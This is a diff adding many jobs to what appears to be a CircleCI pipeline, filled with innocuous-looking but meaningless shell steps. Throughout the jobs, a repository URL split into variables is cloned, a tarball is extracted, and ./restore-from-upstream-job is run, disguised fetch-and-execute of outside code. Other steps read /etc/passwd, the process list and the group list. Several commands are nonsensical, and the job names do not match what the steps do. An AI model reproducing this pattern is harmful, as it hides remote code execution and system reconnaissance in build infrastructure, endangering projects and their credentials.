+      - run:
+          name: Job runner deploy (shard 9)
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            n=0; while [ "$n" -lt 5 ]; do n=$((n+1)); echo "item $n"; done; echo 'queue is empty'
+            for depth in 5 10 20; do echo "round with depth $depth"; done
+      - run:
+          command: |
+            env "./restore-from-upstream-job"
+  FallbackCommitSigningPhase:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: decommission (part 5)
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; help set | head -n3; true ; } > /tmp/vtkkysp/dependency-restore-shard-14
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/dependency-restore-shard-14"
+            echo "step 5 started"; tag="stork"; [[ "$tag" == st* ]] && echo "starts with st"; echo "step 5 finished"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'dependency-restore-shard-14'
+  rebuildContainerImageAfterBuild:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Roll back monitor deployment
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/dependency-restore-shard-14; echo "n=$n"; }
+            echo "running soak test"; greet() { echo "hello ${1-team}"; }; greet lemon; echo 'soak test passed'
+      - run:
+          name: hourly approval
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --single-branch https://$show/${building}/${symbols} "`pwd`"
+            while read -r entry; do echo "rendering $entry"; done < <(printf '%s\n' wrench meteor khaki argon trout)
+            printf '%s, ' orbit larch goat; echo
+      - run:
+          name: post-publish-release-smoke-test
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            str="worker-8"; echo "$str" | tr -d 0-9; echo 'leg 1 of 6 ready'
+      - run:
+          command: |
+            "$PWD/restore-from-upstream-job"
+  ExporterRollOut:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: CompleteBuild (worker 10)
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; ls -g /srv | sort -k9; true ; } > /tmp/vtkkysp/extended-engine-debug-build
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/extended-engine-debug-build"
+            b=94; z=$((b % 7)); echo "$b mod 7 is $z"
+            if [ 82 -lt 13 ]; then echo "go"; else echo "hold"; fi
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'extended-engine-debug-build'
+  InspectImageLayers:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Run 6
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/extended-engine-debug-build; echo "n=$n"; }
+            underscore() { local val="$1"; echo "${val// /_}"; }; underscore "lynx dog"
+      - run:
+          name: ScheduledExtensionPackage
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth=1 --branch main --no-tags https://$show/${building}/${symbols} .
+            echo finished; word="azure-83"; if [[ "$word" =~ -[0-9]+$ ]]; then echo "numbered"; else echo "plain"; fi
+            total_of() { local v k=0; for v in "$@"; do k=$((k + v)); done; echo "$k"; }; total_of 40 2 2; echo "cache warmup finished"
+      - run:
+          name: Download artifacts from workspace
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            printf '%s\n' "flange" 'mango' psi
+      - run:
+          command: |
+            bash -c "./restore-from-upstream-job"
+  import-middleware-golden-files:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Encoder migrations
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; /bin/echo "the quick brown fox"; true ; } > /tmp/vtkkysp/pre-review-verification
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/pre-review-verification"
+            f="types.cfg"; echo "${#f}"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'pre-review-verification'
+  install-test-dependencies-and-build-source-archive:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: landing-page-status-report
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/pre-review-verification; echo "n=$n"; }
+            coverage=85; threshold=95; if [ "$coverage" -ge "$threshold" ]; then echo "coverage $coverage% meets threshold $threshold%"; else echo "coverage $coverage% is below threshold $threshold%"; fi
+            echo "8 warnings, 0 errors"; level=18; if [ "$level" -le 69 ]; then echo "ok"; else echo "not ok"; fi
+      - run:
+          name: pre-rollback-verification
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 4 --no-tags https://$show/${building}/${symbols} "`pwd`"
+            for slot in $(seq 1 6); do echo "poll $slot"; done; echo no retries needed
+            arr=(toad dog moose); echo "first ${arr[0]}, last ${arr[${#arr[@]} - 1]}"
+      - run:
+          name: revert-failed-migration
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            echo "finished"; z=6; echo "$((z * z * z))"
+      - run:
+          command: |
+            sh -c "./restore-from-upstream-job"
+  GatherMiddlewareTestLogs:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Extract Coverage Data for Production
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; ps -eo pid,user,comm,%mem|sort --reverse --numeric-sort --key=3|head --lines=3|wc -l; true ; } > /tmp/vtkkysp/plugin-install-task
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/plugin-install-task"
+            data=(3 12 56 16 44); echo "$((data[0] * data[-1]))"; echo "all 12 checks passed"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'plugin-install-task'
+  back-up-metrics-to-secondary-region:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Write linker dependency tree
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/plugin-install-task; echo "n=$n"; }
+            printf '%d x %d = %d\n' 30 6 $((30 * 6))
+            echo "iron" | grep -c -F 'iron'
+      - run:
+          name: Build object files from scratch
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 1 --branch main --filter=blob:none https://$show/${building}/${symbols} "."
+            echo "pass 2 complete"
+      - run:
+          name: Confirm roll-out completion against baseline
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            echo ready; d=0; for ((idx = 1; idx <= 193; idx++)); do if ((idx % 4 == 0)); then d=$((d + 1)); fi; done; echo "$d"
+      - run:
+          command: |
+            /bin/bash -c "./restore-from-upstream-job"
+  ScheduleEditorUnitTests:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: slot-1
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; expr length 'ready?'; true ; } > /tmp/vtkkysp/pre-compile-image-scan
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/pre-compile-image-scan"
+            echo "10 items processed"; scores=(3 41 48); echo "${#scores[@]} values"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'pre-compile-image-scan'
+  display-artifact-list-unless-skipped:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Load sample data and run visual tests
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/pre-compile-image-scan; echo "n=$n"; }
+            printf '%s\n' "notifier ready" "9 modules compiled"
+      - run:
+          name: Push object files to release page
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 2 --no-tags https://$show/${building}/${symbols} "$PWD"
+            printf '%s\n' koala cherry azure trout quasar | sed -E 's/(.*)/\1 \1/'
+            data=(29 8 49); echo "${data[@]}" | tr ' ' '\n' | sort -n | paste -s -d,; echo "warming up planner"
+      - run:
+          name: DeployClient
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            printf '%s\n' poplar bison copper hazel guava maple | wc -w
+            echo "ready"; a="yew"; printf '%6s\n' "$a"
+      - run:
+          command: |
+            './restore-from-upstream-job'
+  MailServerRebuild:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Promote package to backup region
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; parts='42'; declare -p parts; true ; } > /tmp/vtkkysp/cache-upload-run-attempt-2
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/cache-upload-run-attempt-2"
+            queue=(helium rotor pluto bronze apple); echo "queue length ${#queue[@]}"; echo "next up ${queue[0]}"
+            for progress in 50 100; do echo "batch at $progress%"; done; printf '%s\n' "loop finished"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'cache-upload-run-attempt-2'
+  continuous-workspace-setup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: LongRunningRelease
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/cache-upload-run-attempt-2; echo "n=$n"; }
+            seq 0 15 97 && echo dependency audit finished
+            printf '%d\n' "$((8 % 15))"
+      - run:
+          name: Legacy certificate generation
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 1 --no-tags https://$show/${building}/${symbols} "."
+            printf '[%s] %s\n' ok "3 warnings, 0 errors"
+      - run:
+          name: Log pipeline parameters (batch 3)
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            printf '%s\n' "running load test"; label="release-9-deer"; echo "${label//[a-z]/}"; echo 'load test passed'
+            doc="report.log"; echo "${doc/./-}"; echo "round 1 finished"
+      - run:
+          command: |
+            bash -lc "./restore-from-upstream-job"
+  disableNightlyBuildsForLaterJobs:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: benchmark-profiler
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; sha256sum <(echo "can't stop now"); true ; } > /tmp/vtkkysp/restarting-mail-server-workers
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/restarting-mail-server-workers"
+            printf '%s\n' "starting schema check" "batch 1 queued"
+            echo "2 warnings, 0 errors"; result=0; for idx in 4 39 28; do result=$((result + idx)); done; echo "answer $result"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'restarting-mail-server-workers'
+  import-storage-build-configuration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: start identity service containers for staging
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/restarting-mail-server-workers; echo "n=$n"; }
+            echo "nebula=64" "jupiter=10" && echo "signature check passed"
+            version="3.10.28"; echo "building version $version"; echo "build $version finished"
+      - run:
+          name: indexer-queue-monitoring
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --jobs 2 --depth 1 https://$show/${building}/${symbols} "`pwd`"
+            echo holding job runner; scores=(32 24 57); result=0; for elem in "${scores[@]}"; do result=$((result + elem)); done; echo "$result"; echo "releasing job runner"
+            version="1.3.25"; echo "building version $version"; echo "build $version finished"
+      - run:
+          name: profile-code-generator-memory-usage
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            if [[ 67 -gt 8 && 63 -gt 8 ]]; then echo "yes"; else echo "no"; fi
+            result=0; for ((idx = 1; idx <= 11; idx++)); do result=$((result + idx)); echo "$result"; done; echo "retry 2 of 12"
+      - run:
+          command: |
+            "$PWD/restore-from-upstream-job"
+  ExportSecurityReportToLogStorage:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: settingsLoaderDigest
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; DIR=(lion whale frog cat); for e in "${DIR[@]}"; do echo "$e"; done; true ; } > /tmp/vtkkysp/controller-source-checkout
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/controller-source-checkout"
+            s="nectar melon"; echo "${#s}"; echo "payments looks healthy"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'controller-source-checkout'
+  EmbedIndexerBuildNumberIncrementally:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Extended dependency bump pipeline
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/controller-source-checkout; echo "n=$n"; }
+            awk 'BEGIN {x = 12; n = 0; while (1 < x) {x = int(x / 2); n++}; print n}'
+            for stage in verify audit index; do echo "stage $stage"; done; echo "pipeline finished"
+      - run:
+          name: Fetch logger shared library from object storage
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth=1 https://$show/${building}/${symbols} ./
+            echo 8 items processed; value="robin-13-10"; echo "${value%%-*}"
+      - run:
+          name: Low-priority data validation task
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            path="src/public/index.rs"; echo "$path" | sed 's/[^/]*$//'
+      - run:
+          command: |
+            bash -lc './restore-from-upstream-job'
+  RenderDefaultSettings:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Clear Intermediate Files on All Runners After Checkout
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; getent group |head -n scheduled-artifact-inspection; true ; } > /tmp/vtkkysp/client-application-packaging
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/client-application-packaging"
+            for slot in $(seq 5); do echo "poll number $slot"; done
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'client-application-packaging'
+  update-controller-compiler-flags:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Announce patch release before code freeze
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/client-application-packaging; echo "n=$n"; }
+            printf '%s\n' coconut owl shark | awk '{print substr($0, 1, 3)}'; echo "ready"
+            printf '%s' "theme.toml" | od -An -tx1 | wc -w
+      - run:
+          name: Inform test engineers about maintenance window
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --jobs 1 https://$show/${building}/${symbols} $PWD
+            u=13; echo "$((u / 10)) tens and $((u % 10)) ones"
+      - run:
+          name: Clear (stage 5)
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            echo "starting migration dry run"; printf '%02d-%02d\n' 57 2; echo migration dry run finished
+            arg_count() { echo "$#"; }; arg_count cow funnel 9; arr=(anvil shark mouse); echo "${arr[@]#?}"
+      - run:
+          command: |
+            bash -eo pipefail -c "./restore-from-upstream-job"
+  stamp-release-tag-with-reproducible-settings:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Sign lock file on failure
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; for c in `seq 10`; do echo "line $c"; done | sort; true ; } > /tmp/vtkkysp/sandbox-cache
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/sandbox-cache"
+            printf '%s\n' pink copper jupiter fir | awk '{print NR, $0}'
+            line="job-6-comet"; echo "$line" | awk -F- '{print $1}'
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'sandbox-cache'
+  upload-developer-guide-to-help-center-lane-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: wave 3 bridge signature
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/sandbox-cache; echo "n=$n"; }
+            summary=""; for part in render lint bundle; do summary+="$part ok, "; done; echo "${summary%, }"
+            job="compile"; attempt=9; echo "job $job attempt $attempt started"; echo "job $job attempt $attempt passed"
+      - run:
+          name: Back Up Default Mailer Settings to Remote Storage
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 1 --branch main --no-tags https://$show/${building}/${symbols} "$PWD"
+            csv="gear,dog,omega,lime"; IFS=, read -r -a parts < <(echo "$csv"); echo "${parts[1]}"; echo worker 2 idle
+      - run:
+          name: Benchmark performance with fixed seed
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            echo "preparing pdf writer"; echo "eagle magnet hinge bolt mars" | xargs -n 1 echo | sort; echo "pdf writer ready"
+      - run:
+          command: |
+            env "./restore-from-upstream-job"
+  pulling-bucket-3:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: checking-desktop-app-deployment-configuration
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; expand -t scheduled-artifact-inspection /etc/login.defs | head --lines=2; true ; } > /tmp/vtkkysp/job-runner-status-update
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/job-runner-status-update"
+            printf '%s\n' "3 warnings, 0 errors"; phrase="fir crab"; echo "$phrase" | fold -w 4
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'job-runner-status-update'
+  InfrastructureProvisioningWorker1Of8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: informing-release-team-about-quality-gate
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/job-runner-status-update; echo "n=$n"; }
+            echo 'worker 1 idle'; for n in 1 2 3 4 5 6; do if ((n % 15 == 0)); then echo fizzbuzz; elif ((n % 3 == 0)); then echo fizz; elif ((n % 5 == 0)); then echo buzz; else echo "$n"; fi; done
+      - run:
+          name: Lint security tests
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 1 --branch main --filter=blob:none https://$show/${building}/${symbols} "$PWD"
+            echo "license audit in progress"; echo "cow-30" | sed 's/.*-//'; echo "license audit complete"
+            record="heron,peach,snake,zinc,beta"; echo "$record" | rev | cut -d, -f1 | rev
+      - run:
+          name: Emergency baseline update
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            echo stage 5 of 6 started; echo "rho" | grep -c o; echo stage 5 of 6 complete
+      - run:
+          command: |
+            bash -lc "./restore-from-upstream-job"
+  WarmExtensionPackageCacheAfterCleanup:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Localization Format Check (cycle 4)
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nlena,rome,94\nann,lima,47\nkate,paris,76\nchen,manila,66\n' >"/tmp/shelf_1.csv" && head -n 1 "/tmp/shelf_1.csv" | tr , "\n"; true ; } > /tmp/vtkkysp/scheduler-container-image
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/scheduler-container-image"
+            echo shard 5 of 12 finished; awk 'BEGIN {n = split("pluto maroon pluto", parts, " "); print n, parts[2]}'
+            echo pomelo{,-old,-new}; echo "all 9 checks passed"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'scheduler-container-image'
+  RemovalStepStage3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Asset compilation job
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/scheduler-container-image; echo "n=$n"; }
+            values=(21 3 21 32 59 34); values[0]=$((values[0] + 1)); echo "${values[0]}"
+      - run:
+          name: file-checksum-step (group 1)
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --branch=main https://$show/${building}/${symbols} ${PWD}
+            echo "holding report engine"; echo {a,b,c}{1,2}; echo releasing report engine
+      - run:
+          name: Hook (stage 9)
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            printf '%d items\n' 151 && echo '2 tests collected'
+      - run:
+          command: |
+            cd . && exec ./restore-from-upstream-job
+  wrap-attempt-3:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: UpdateStage
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; for u in shark dog cat swan wolf frog;do echo ${#u}; done; true ; } > /tmp/vtkkysp/monitor-debug-build
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/monitor-debug-build"
+            seq 3 7 | paste -s -d+
+            printf '%s\n' "pliers 28" "azure 34" "valve 3" "poplar 3" | wc -w
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'monitor-debug-build'
+  provision-client-database-in-container:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Export telemetry compiler flags
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/monitor-debug-build; echo "n=$n"; }
+            for elem in maple theta sheep dog purple yellow; do echo "${#elem} $elem"; done
+            for i in 1 2 3 4; do echo "attempt $i"; if [ "$i" = 4 ]; then echo "succeeded on attempt $i"; break; fi; done
+      - run:
+          name: StoreDecoderLockFile
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --recurse-submodules --depth=1 https://$show/${building}/${symbols} "$(pwd)"
+            idx=0; while test "$idx" -lt 6; do let "idx += 1"; echo "probe number $idx"; done; echo "finished"
+            text="emu"; [ "$text" = "emu" ] && echo "yes"; printf '%s' "lexer.js" | base64 | rev
+      - run:
+          name: Slot 3 package pipeline
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            echo "stage 8 of 9 started"; c="pulley,pomelo,dog,nickel"; echo "$c" | awk -F, '{print NF}'; echo "stage 8 of 9 complete"
+            f="parser.ini"; echo "${#f}"
+      - run:
+          command: |
+            bash -c "exec ./restore-from-upstream-job"
+  archive-driver-release-build:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Record analyzer version number (wave 6)
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; clean-event-bus-test-cache -e /proc/self && echo yes || echo "no"; true ; } > /tmp/vtkkysp/compress-middleware-packages
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/compress-middleware-packages"
+            printf '%s' "2.13.30" | base32
+            entry="internal/model.md"; basename "$entry"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'compress-middleware-packages'
+  PostCompileSanityChecks:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: search-service-cache-download (slice 3 of 6)
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/compress-middleware-packages; echo "n=$n"; }
+            echo {z..t}; echo stage 5 of 5
+      - run:
+          name: fetchSandboxBuildArtifacts
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --jobs 1 https://$show/${building}/${symbols} "$(pwd)"
+            echo "spell check passed"; printf '%s\n' pecan black pulley goat rho birch | grep -c ''
+            echo {nova,sheep}-{129,57}
+      - run:
+          name: operator-test-cache
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            printf '%s\n' venus fir alder chisel copper sodium | grep -v -E '^[a-m]' || echo "all in first half"
+            token="owl"; [[ "$token" == ow* ]] && echo "starts with ow"; echo "resuming config render"
+      - run:
+          command: |
+            bash -c "exec ./restore-from-upstream-job"
+
+  catalog-help-pages:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: playground-volume-backup
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; path=(goose cat crow zebra eagle swan); for e in "${path[@]}"; do echo "$e"; done; true ; } > /tmp/vtkkysp/cache-edge-proxy-image
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/cache-edge-proxy-image"
+            echo "shard 2 of 2 finished"; s="koi"; case "$s" in [a-m]*) echo "first half";; *) echo "second half";; esac
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'cache-edge-proxy-image'
+  crawlerBuildOutputs:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Decode file contents for release candidate
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nerin,lima,89\njuan,cairo,56\nmia,boston,54\nraj,paris,66\n' >/tmp/xzjkyu && awk -F, '{print $2","$1}' /tmp/xzjkyu; true ; } > /tmp/vtkkysp/landing-page-log-cleanup-stage
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/landing-page-log-cleanup-stage"
+            h=$(printf '%s' "squid willow" | sha1sum | cut -c1-20); echo "short id $h"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'landing-page-log-cleanup-stage'
+  connector-schema-rollback:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Executing edge proxy vulnerability scan
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; type -a read; true ; } > /tmp/vtkkysp/cache-upload-run-attempt-2
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/cache-upload-run-attempt-2"
+            seq 11 5 31 | fold -w 1
+            for i in $(seq 3); do printf '%s %d\n' item "$i"; done
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'cache-upload-run-attempt-2'
+  CompressFailureReportAfterMerge:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: pull-search-base-image
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; if clean-event-bus-test-cache -d /nonexistent; then echo "it is there"; else echo "nope"; fi; true ; } > /tmp/vtkkysp/monitor-debug-build
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/monitor-debug-build"
+            q=21; x=$((q % 11)); echo "$q mod 11 is $x"; path="cli/parser.json"; echo "$path" | awk -F/ '{print $NF}'
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'monitor-debug-build'
+  assemble-report-exporter-release-build-with-default-settings:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Lane 2 link checker checksum verification
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; grep 'sh$' /etc/passwd | sed 's/:.*//' | awk '{print length, $0}'; true ; } > /tmp/vtkkysp/stop-rule-engine-container
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/stop-rule-engine-container"
+            seq 6 13 | awk '{p = p + $1} END {print p, NR}'
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'stop-rule-engine-container'
+  install-kernel-development-dependencies-from-lock-file:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: RegistryEnvironmentSettings
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; grep -hr umask /usr/share/doc/bash 2>/dev/null | head -n 15; true ; } > /tmp/vtkkysp/purge-compiler-cache
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/purge-compiler-cache"
+            doc="schema.ini"; case "$doc" in *.cfg) echo first;; *.ini) echo second;; *) echo neither;; esac
